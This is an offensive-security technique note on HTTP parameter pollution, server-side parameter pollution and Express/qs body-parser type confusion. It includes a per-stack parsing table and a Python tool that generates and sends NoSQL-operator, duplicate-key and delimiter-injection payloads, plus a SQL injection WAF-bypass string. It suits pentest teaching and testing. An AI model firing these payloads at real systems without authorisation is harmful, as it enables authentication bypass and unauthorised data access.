---
title: "Parameter Pollution - HPP, Server-Side Parameter Pollution and Body-Parser Confusion"
category: web
subcategory: nodejs
type: technique
tags: [hpp, http-parameter-pollution, sspp, server-side-parameter-pollution, body-parser, parser-differential, express, qs, array-injection, type-confusion, nosql, waf-bypass, cache-key, auth-bypass, burp]
difficulty: medium
summary: "Duplicate/array/object parameters parse differently per stack: a[]=x turns a string check into an array bypass; %26 injected into a value re-serialized into an internal query adds hidden params."
when_to_use:
  - "A comparison like token !== expected that you can feed an array/object to (Express)"
  - "Two components read the same parameter (front-end vs back-end, cache vs origin)"
  - "A value is re-serialized into an internal API request (SSPP)"
  - "A WAF or auth layer parses parameters differently from the app"
tools: [burp, python3]
related: [proto-pollution, deser-node-vm-escape, node-cors-postmessage-websocket, smuggling-http]
---

## TL;DR

Send the same parameter twice, or as an array/object, and different components disagree about
its value and type. Express turns `a=1&a=2` into `["1","2"]`, so `if (token !== expected)`
compares an array to a string and never matches. Injecting `%26`/`%23`/`%3D` into a value that
the backend re-serializes into an *internal* request (SSPP) smuggles extra parameters into a
trusted API call.

## Recognise it

- A parameter used in a strict comparison, a signature check, or a role/id lookup.
- Express/`qs`, PHP, ASP.NET, JSP, Flask, Django, Rails, Go behind a proxy/WAF/cache.
- A value that reappears inside a server-to-server request (`/api/user?id=<value>`), a template,
  an email link, or a signed URL.
- Different `Content-Type` handling (JSON vs urlencoded vs multipart).

## Theory

### Which value wins, per stack

Verify empirically -- this table is a starting point, not gospel:

| Stack | `a=1&a=2` yields | How to get all values |
| --- | --- | --- |
| PHP (`$_GET['a']`) | `2` (last) | `a[]=1&a[]=2` -> array |
| ASP.NET (`Request["a"]`) | `1,2` (comma-joined) | `Request.Params.GetValues` |
| ASP classic | `1, 2` (comma-joined) | -- |
| JSP/Tomcat (`getParameter`) | `1` (first) | `getParameterValues` |
| Flask/Werkzeug (`args.get`) | `1` (first) | `args.getlist('a')` |
| Django (`QueryDict['a']`) | `2` (last) | `request.GET.getlist('a')` |
| Node/Express (`req.query.a`) | `["1","2"]` (**array**) | it is already the array |
| Ruby/Rack (`params['a']`) | `2` (last) | -- |
| Go (`r.FormValue`) | `1` (first) | `r.Form["a"]` |
| Spring (`@RequestParam`) | `1` (first) | `List<String>` binding |
| Perl CGI (`param`) | context-dependent | list context -> all |

The exploitable disagreements: a **WAF that reads the first** value while the **app reads the
last** (send `a=benign&a=malicious`), or a **cache that keys on one** and an **origin that uses
another**.

### Express body-parser type confusion

`qs` (Express's default query parser and `extended:true` body parser) builds arrays and objects
from bracket syntax:

```
a=1&a=2        -> a = ["1","2"]        (duplicate keys)
a[]=1          -> a = ["1"]            (explicit array)
a[b]=1         -> a = { b: "1" }       (object)
a[b][c]=1      -> a = { b: { c: "1" } }
```

So a check written for a string breaks on a non-string:

```js
if (req.query.token !== process.env.TOKEN) return res.status(403);
// ?token[]=x  ->  ["x"] !== "secret"  is true, but a check like
// if (req.query.admin == 'true')  ->  ?admin[]=true  can flip loose checks,
// and String(req.query.role) on {toString...} / array changes the value.
```

More damaging patterns:

- `db.find({ user: req.query.user })` with `?user[$ne]=` -> NoSQL operator injection
  (`{$ne: ""}` matches everything). See a NoSQL-specific note; the *delivery* is HPP.
- `crypto.timingSafeEqual(a, Buffer.from(req.query.sig))` throws or misbehaves on an array.
- `parseInt(req.query.n)` on `["1","2"]` -> `NaN` -> a limit check passes.
- A JSON body `{"a":1,"a":2}` -- JS `JSON.parse` keeps the **last** (`2`), but some parsers
  (and some languages) keep the first; a signature computed over the raw body but validated
  against the parsed body desynchronises.

### `qs` depth / arrayLimit quirks

`qs` has `arrayLimit` (default 20): `a[21]=x` becomes `{ "21": "x" }` (an object, not a sparse
array), and `depth` (default 5) collapses deeper nesting into a literal key. Both change the
*type* the app sees, which is another confusion lever.

### Content-Type routing

The same key parsed by different body parsers:

```
Content-Type: application/x-www-form-urlencoded   -> qs / querystring
Content-Type: application/json                    -> JSON.parse (real types, last dup wins)
Content-Type: multipart/form-data                 -> busboy/formidable (own dup rules)
Content-Type: text/plain                          -> often unparsed -> undefined
```

Switching Content-Type can move a value from "string" to "object", skip a validator that only
runs for one parser, or bypass a CSRF check that only guards JSON.

### Server-Side Parameter Pollution (SSPP)

The app takes your value and *builds a new request* with it, without re-encoding:

```
you send:   GET /profile?name=alice%26admin=true
app calls:  GET http://internal/api/user?name=alice&admin=true
                                              ^ your injected &admin=true
```

Delimiters to test, one at a time (PortSwigger methodology):

- `%26` (`&`) -- add a parameter to the internal query.
- `%23` (`#`) -- truncate the internal query, dropping parameters the app appended after yours.
- `%3d` (`=`) -- split a value into key=value.
- `%2f` / `%252f` -- path-segment SSPP when the value lands in the internal *path*.

Watch for behaviour or error changes: a `#` that makes a required internal parameter vanish
often triggers a distinctive 500 or a different response, confirming injection even when you
cannot see the internal request.

### Cache-key and WAF bypass

- A cache keyed on `?a` but not `?a&a` (or vice versa) lets you poison/segment the cache.
- A WAF inspecting the first occurrence while PHP uses the last: `id=1&id=1' OR '1'='1`.

## Attack

1. Identify the stack (behaviour of `a=1&a=2`) and the parser (`qs` bracket support).
2. On any strict/loose comparison, try `param[]=`, `param[x]=`, and a JSON object.
3. On any value re-used in an internal request, inject `%26x=y`, then `%23`, then `%3d`, one at
   a time, watching for changes.
4. On a proxy/cache/WAF stack, exploit the first-vs-last disagreement.
5. Confirm with a positive effect (auth bypass, extra data, cache split), not just an error.

## Code

```python
#!/usr/bin/env python3
"""HPP / SSPP / body-parser confusion variant generator.

Given a URL and a parameter, emit every duplication / array / object /
content-type / SSPP-delimiter variant as a prepared request. Nothing is sent
during the self-test; `send_all` fires them and diffs responses when you have
a target.
"""
from __future__ import annotations

import sys
import urllib.parse
from dataclasses import dataclass


@dataclass
class Variant:
    name: str
    method: str
    url: str
    headers: dict
    body: str | None


def _q(url: str, query: str) -> str:
    sep = "&" if urllib.parse.urlparse(url).query else "?"
    return url + sep + query


def hpp_variants(url: str, param: str, benign: str = "1",
                 evil: str = "2") -> list[Variant]:
    """Duplication / array / object / content-type variants."""
    out: list[Variant] = []
    form = {"Content-Type": "application/x-www-form-urlencoded"}
    js = {"Content-Type": "application/json"}

    # duplicate keys, both orders (first-vs-last disagreements)
    out.append(Variant("dup_be", "GET",
                       _q(url, "%s=%s&%s=%s" % (param, benign, param, evil)),
                       {}, None))
    out.append(Variant("dup_eb", "GET",
                       _q(url, "%s=%s&%s=%s" % (param, evil, param, benign)),
                       {}, None))
    # explicit array
    out.append(Variant("array", "GET", _q(url, "%s[]=%s" % (param, evil)),
                       {}, None))
    out.append(Variant("array2", "GET",
                       _q(url, "%s[]=%s&%s[]=%s" % (param, benign, param, evil)),
                       {}, None))
    # object
    out.append(Variant("object", "GET", _q(url, "%s[x]=%s" % (param, evil)),
                       {}, None))
    # NoSQL operator injection via bracket
    out.append(Variant("nosql_ne", "GET", _q(url, "%s[$ne]=" % param), {}, None))
    out.append(Variant("nosql_gt", "GET", _q(url, "%s[$gt]=" % param), {}, None))
    # body variants
    out.append(Variant("body_dup", "POST", url, dict(form),
                       "%s=%s&%s=%s" % (param, benign, param, evil)))
    out.append(Variant("body_array", "POST", url, dict(form),
                       "%s[]=%s" % (param, evil)))
    out.append(Variant("json_array", "POST", url, dict(js),
                       '{"%s": ["%s","%s"]}' % (param, benign, evil)))
    out.append(Variant("json_object", "POST", url, dict(js),
                       '{"%s": {"$ne": null}}' % param))
    out.append(Variant("json_dupkey", "POST", url, dict(js),
                       '{"%s": "%s", "%s": "%s"}' % (param, benign, param, evil)))
    # qs arrayLimit type flip
    out.append(Variant("arraylimit", "GET", _q(url, "%s[999]=%s" % (param, evil)),
                       {}, None))
    return out


def sspp_variants(url: str, param: str, inject_key: str = "admin",
                  inject_val: str = "true") -> list[Variant]:
    """Delimiter injection for server-side parameter pollution."""
    payloads = {
        "amp": "%s%%26%s=%s" % ("VALUE", inject_key, inject_val),   # &admin=true
        "hash_trunc": "%s%%23" % "VALUE",                          # #  truncate
        "eq_split": "%s%%3d%s" % ("VALUE", inject_val),            # =value
        "path_2f": "%s%%2f..%%2f%s" % ("VALUE", inject_key),       # path SSPP
        "path_252f": "%s%%252f%s" % ("VALUE", inject_key),         # double-encoded
    }
    out = []
    for name, tmpl in payloads.items():
        val = tmpl.replace("VALUE", "alice")
        out.append(Variant("sspp_" + name, "GET",
                          _q(url, "%s=%s" % (param, val)), {}, None))
    return out


def all_variants(url: str, param: str) -> list[Variant]:
    return hpp_variants(url, param) + sspp_variants(url, param)


def send_all(variants: list[Variant]):
    """Fire every variant and return (name, status, len). Needs `requests`."""
    import requests
    results = []
    for v in variants:
        try:
            r = requests.request(v.method, v.url, headers=v.headers,
                                 data=v.body, timeout=10)
            results.append((v.name, r.status_code, len(r.content)))
        except Exception as exc:
            results.append((v.name, "ERR", str(exc)))
    return results


def _self_test() -> None:
    vs = all_variants("http://t/api", "token")
    by = {v.name: v for v in vs}

    # duplication, both orders
    assert "token=1&token=2" in by["dup_be"].url
    assert "token=2&token=1" in by["dup_eb"].url

    # array / object encodings
    assert "token[]=2" in by["array"].url
    assert "token[x]=2" in by["object"].url

    # NoSQL operator delivery
    assert "token[$ne]=" in by["nosql_ne"].url
    assert "token[$gt]=" in by["nosql_gt"].url

    # content types
    assert by["json_array"].headers["Content-Type"] == "application/json"
    assert by["json_array"].body == '{"token": ["1","2"]}'
    assert by["json_object"].body == '{"token": {"$ne": null}}'
    assert by["body_dup"].headers["Content-Type"].startswith(
        "application/x-www-form-urlencoded")
    # duplicate JSON key (last-wins parser differential)
    assert by["json_dupkey"].body.count('"token"') == 2

    # qs arrayLimit flip
    assert "token[999]=2" in by["arraylimit"].url

    # SSPP delimiters, each present exactly once, encoded
    assert "%26admin=true" in by["sspp_amp"].url
    assert by["sspp_hash_trunc"].url.endswith("%23")
    assert "%3d" in by["sspp_eq_split"].url
    assert "%2f" in by["sspp_path_2f"].url
    assert "%252f" in by["sspp_path_252f"].url

    # methods are valid
    assert all(v.method in ("GET", "POST") for v in vs)
    assert len(vs) >= 18

    print("[ok] %d variants generated (%d HPP + %d SSPP)"
          % (len(vs), len(hpp_variants("http://t/api", "token")),
             len(sspp_variants("http://t/api", "token"))))


def main() -> int:
    if len(sys.argv) < 3:
        print("usage: %s <url> <param>" % sys.argv[0])
        return 1
    for v in all_variants(sys.argv[1], sys.argv[2]):
        print("%-16s %-4s %s %s"
              % (v.name, v.method, v.url, v.body or ""))
    return 0


if __name__ == "__main__":
    if len(sys.argv) > 1:
        raise SystemExit(main())
    _self_test()
```

## Variants & pitfalls

- **Always verify the stack empirically.** The last/first/all table is a hypothesis; a proxy in
  front can change everything.
- **Express arrays break `String` coercion subtly**: `String(["1","2"])` is `"1,2"`, but
  `String(["payload"])` is `"payload"` -- a single-element array can *pass* a string check while
  a `.startsWith`/regex behaves differently.
- **`===` vs `==`**: an array is never `===` a string, so strict checks *fail open* if the code
  is `if (a !== b) reject()` -- the array bypasses it. Loose checks may coerce.
- **NoSQL operators need the object form** (`param[$ne]=`), which Express builds from brackets;
  urlencoded arrays alone will not do it.
- **JSON duplicate keys**: the raw-body-vs-parsed-body signature desync is subtle and
  parser-specific; test whether the signature is computed over bytes or over the object.
- **SSPP is often blind** -- rely on the `%23`-drops-a-required-param error oracle.
- **Double-encoding** (`%252f`, `%2526`) matters when the value is decoded twice (proxy + app).
- **Cache poisoning via HPP**: only works if the duplicated parameter is unkeyed; see
  `cache-poisoning-deception`.
- **WAF bypass**: split a payload across duplicate parameters the WAF inspects separately but the
  app concatenates (ASP.NET comma-join is the classic).

## Tools

- Burp Repeater/Intruder -- the payloads are all URL/body strings; test one delimiter at a time.
- Burp Param Miner -- discovers parameters and duplicate-handling behaviour.
- `qs` REPL (`node -e "console.log(require('qs').parse('a[b]=1'))"`) to model Express parsing.

## References

- Luca Carettoni & Stefano di Paola -- "HTTP Parameter Pollution" (OWASP AppSecEU 2009), the original.
- PortSwigger Web Security Academy -- Server-side parameter pollution.
- `qs` documentation -- `arrayLimit`, `depth`, bracket parsing.
- OWASP Testing Guide -- Testing for HTTP Parameter Pollution.
